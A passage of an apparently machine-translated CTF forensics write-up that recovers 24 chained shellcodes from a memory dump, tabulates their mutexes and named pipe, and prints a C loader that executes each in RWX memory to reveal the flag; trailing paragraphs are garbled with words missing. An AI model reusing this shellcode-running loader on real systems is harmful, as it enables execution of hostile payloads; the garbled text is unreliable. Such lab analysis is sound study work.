SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe<font></font>
SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe<font></font>
SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=AB82C zn_2019\injector.exe<font></font>
SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe<font></font>
SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe<font></font>
SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe<font></font>
SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe<font></font>
SIGN.MEDIA=BA802 zn_2019\server\run.exe<font></font>
SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe<font></font>
SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe<font></font>
SIGN.MEDIA=E00058 zn_2019\Injector2.exe<font></font>
SIGN.MEDIA=E00058 zn_2019\injector.exe<font></font>
SIGN.MEDIA=E00058 zn_2019\note.exe<font></font>
SIGN.MEDIA=E00058 zn_2019\note2.exe<font></font>
SIGN.MEDIA=E00058 zn_2019\note2.exe<font></font>
SIGN.MEDIA=E9982 zn_2019\server\run.exe</code></pre><br>
<p>I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM).</p><br>
<p><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br>
<img src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br>
<p><strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it.</p><br>
<p>This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument.</p><br>
<p><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br>
<p>I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump.</p><br>
<p>One of shellcode #21 contained references to other, it is probably the main one.</p><br>
<pre><code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw<font></font>
Global\jGzXXZJbXGPYniopljDEdwuD<font></font>
Global\jpBuyMNJzdnpwHimVlcBkwGo<font></font>
Global\ArlCJOxJFOKRkqOLcBhvjYqj<font></font>
Global\THxjCBohxSlNgCFbwJsHujqk<font></font>
Global\BOiJhsLFBuZdsFdCrLKEucpJ<font></font>
Global\iYxszVIFfsuzzEmGwgOQeEcb<font></font>
Global\NOluZoXPJalShopCCuNnWQbR<font></font>
Global\GCrtPmNEAOsZpSNNBdiYQfgz<font></font>
Global\pVVgeqcREhXSgKCwhkeyfTXw<font></font>
Global\trsQPehKvlxBJhEqIPtwzjxi<font></font>
Global\ngVrhgAEqcDssFsNerrAZsFz<font></font>
Global\KiZvGyiMnyTgvQdFNGcudfTY<font></font>
Global\FzXvKPKGCPMAERklFMXVMYga<font></font>
Global\nCZpFZPtyidhFOvVeemfyJAC<font></font>
Global\pjRmfOLLBXIbsJholoasvrqC<font></font>
Global\mhOVYcYRKgWdABAsgkvrcOOM<font></font>
Global\syGiShcLTXfQYGAAiafYBxoF<font></font>
Global\KbFVsPCPZrfVlUIQlvVoJLXW<font></font>
Global\XbuYiHCxQLTLApuToFldJIgI<font></font>
Global\auFqpIQAlsHcvjPEakqHyIeA<font></font>
Global\MrnXOMJvHmYBxRfkbLBUYWgn<font></font>
Global\GYVOmvrLhCpgQUPfnOshzzem<font></font>
Global\qaswedfrtghyujkiol121232<font></font>
\\.\pipe\zn_shell_stor</code></pre><br>
<p>Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong>.</p><br>
<div class="scrollable-table"><table>
<thead>
<tr>
<th>File</th>
<th>Tags</th>
<th>Mutex</th>
</tr>
</thead>
<tbody>
<tr>
<td>b1</td>
<td>mov mov</td>
<td>Global\GCrtPmNEAOsZpSNNBdiYQfgz</td>
</tr>
<tr>
<td>b2</td>
<td>SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ"</td>
<td>Global\NOluZoXPJalShopCCuNnWQbR</td>
</tr>
<tr>
<td>b3</td>
<td>inc byte [rbp+0Ch]</td>
<td>Global\ngVrhgAEqcDssFsNerrAZsFz</td>
</tr>
<tr>
<td>b4</td>
<td>repne scasb strlen() == 18</td>
<td>Global\jpBuyMNJzdnpwHimVlcBkwGo</td>
</tr>
<tr>
<td>b5</td>
<td>??</td>
<td>Global\ArlCJOxJFOKRkqOLcBhvjYqj</td>
</tr>
<tr>
<td>b6</td>
<td>xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83"</td>
<td>Global\MrnXOMJvHmYBxRfkbLBUYWgn</td>
</tr>
<tr>
<td>b7</td>
<td>??</td>
<td>Global\GYVOmvrLhCpgQUPfnOshzzem</td>
</tr>
<tr>
<td>b8</td>
<td>cmp word [rbp+0Ch], 12h</td>
<td>Global\KbFVsPCPZrfVlUIQlvVoJLXW</td>
</tr>
<tr>
<td>b9</td>
<td>??</td>
<td>Global\BOiJhsLFBuZdsFdCrLKEucpJ</td>
</tr>
<tr>
<td>b10</td>
<td>??</td>
<td>Global\iYxszVIFfsuzzEmGwgOQeEcb</td>
</tr>
<tr>
<td>b11</td>
<td>cmp</td>
<td>Global\pjRmfOLLBXIbsJholoasvrqC</td>
</tr>
<tr>
<td>b12</td>
<td>add xor cl x2</td>
<td>Global\nCZpFZPtyidhFOvVeemfyJAC</td>
</tr>
<tr>
<td>b13</td>
<td>inc [rbp+0Ch]</td>
<td>Global\auFqpIQAlsHcvjPEakqHyIeA</td>
</tr>
<tr>
<td>b14</td>
<td>dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch]</td>
<td>Global\syGiShcLTXfQYGAAiafYBxoF</td>
</tr>
<tr>
<td>b15</td>
<td>WIN! Sleep Beep</td>
<td>Global\XbuYiHCxQLTLApuToFldJIgI</td>
</tr>
<tr>
<td>b16</td>
<td>save byte</td>
<td>Global\mhOVYcYRKgWdABAsgkvrcOOM</td>
</tr>
<tr>
<td>b17</td>
<td>add xor cl x2</td>
<td>Global\FzXvKPKGCPMAERklFMXVMYga</td>
</tr>
<tr>
<td>b18</td>
<td>zero rbp (0, 211h, 80h)</td>
<td>Global\trsQPehKvlxBJhEqIPtwzjxi</td>
</tr>
<tr>
<td>b19</td>
<td>??</td>
<td>Global\KiZvGyiMnyTgvQdFNGcudfTY</td>
</tr>
<tr>
<td>b20</td>
<td>Read from C:\beeps\flag.txt</td>
<td>Global\vtHAjnNbCecOeNAnVeQFmdRw</td>
</tr>
<tr>
<td>b21</td>
<td>MAIN</td>
<td></td>
</tr>
<tr>
<td>b22</td>
<td>Xor</td>
<td>Global\THxjCBohxSlNgCFbwJsHujqk</td>
</tr>
<tr>
<td>b23</td>
<td>cmp dw[rbp+0Ch], 256 dec</td>
<td>Global\pVVgeqcREhXSgKCwhkeyfTXw</td>
</tr>
<tr>
<td>b24</td>
<td>beep(1000, 1100)</td>
<td>Global\jGzXXZJbXGPYniopljDEdwuD</td>
</tr>
</tbody>
</table></div><br>
<p>Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing.</p><br>
<p>I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong>, where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work.</p><br>
<pre><code class="plaintext hljs">#include &lt;windows.h&gt;<font></font>
<font></font>
void load_shellcode(int index) {<font></font>
    FILE* fp;   <font></font>
    DWORD dwThread;<font></font>
    int size;<font></font>
    CHAR filename[32];<font></font>
<font></font>
    sprintf_s(filename, "b%i", index);<font></font>
    fopen_s(&amp;fp, filename, "rb");<font></font>
    fseek(fp, 0, SEEK_END);<font></font>
    size = ftell(fp);<font></font>
    fseek(fp, 0, SEEK_SET); <font></font>
    LPVOID pMem = VirtualAlloc(<font></font>
        NULL, <font></font>
        0x1000, <font></font>
        MEM_COMMIT | MEM_RESERVE, <font></font>
        PAGE_EXECUTE_READWRITE<font></font>
    );<font></font>
    printf("Loaded %i | size=%i | at %p\n", index, size, pMem); <font></font>
    fread(pMem, 1, size, fp);   <font></font>
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread);<font></font>
    fclose(fp);<font></font>
}<font></font>
<font></font>
int main() {<font></font>
    load_shellcode(21);<font></font>
    Sleep(1000);<font></font>
    for (int i = 1; i &lt;= 24; i++) {<font></font>
        if (i == 21)<font></font>
            continue;<font></font>
        load_shellcode(i);<font></font>
    }<font></font>
    while (1)<font></font>
        Sleep(1000);<font></font>
}</code></pre><br>
<p>I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6).</p><br>
<p>Program executed and flag showed up in memory after XOR operation.</p><br>
<p>Flag: <strong><em>zn{$ucH<em>SL0W</em>!pC}</em></strong></p></div></div><br>
<p> sysenter    6 .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>.</p><br>
<h2> </h2><br>
<p>               .   136     .</p><br>
<p>      .<br>
      — ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Digital Security</a>.      (AV1ct0r),     22 15   .</p><br>
<p>    Protected Shell  RuCTFE.       — 10.   vos,     1 26.</p><br>
<p>,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ZeroNights</a>.</p></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja472404/index.html">2D衝突計算：Gilbert-Johnson-Kirtiアルゴリズム</a></li>
<li><a href="../ja472406/index.html">ピザの配達中にデータセンターを拡張する</a></li>
<li><a href="../ja472410/index.html">利用可能なカラーシステムの設計</a></li>
<li><a href="../ja472412/index.html">システムアナリストと製品の測定基準-振るが、混ぜない？</a></li>
<li><a href="../ja472414/index.html">高速中性子炉の長い歴史と閉じた燃料サイクルの可能性</a></li>
<li><a href="../ja472418/index.html">カスタム開発の権利を維持する方法</a></li>
<li><a href="../ja472420/index.html">延期されたPromiseによるインターフェースの応答性の向上</a></li>
<li><a href="../ja472422/index.html">Sber X RamblerFront＆Meet Up</a></li>
<li><a href="../ja472426/index.html">Security Week 43：IoTハニポットの秘密の生活</a></li>
<li><a href="../ja472430/index.html">スマートホームのコンポーネントベースの選択方法：センサーとコントローラーについて</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>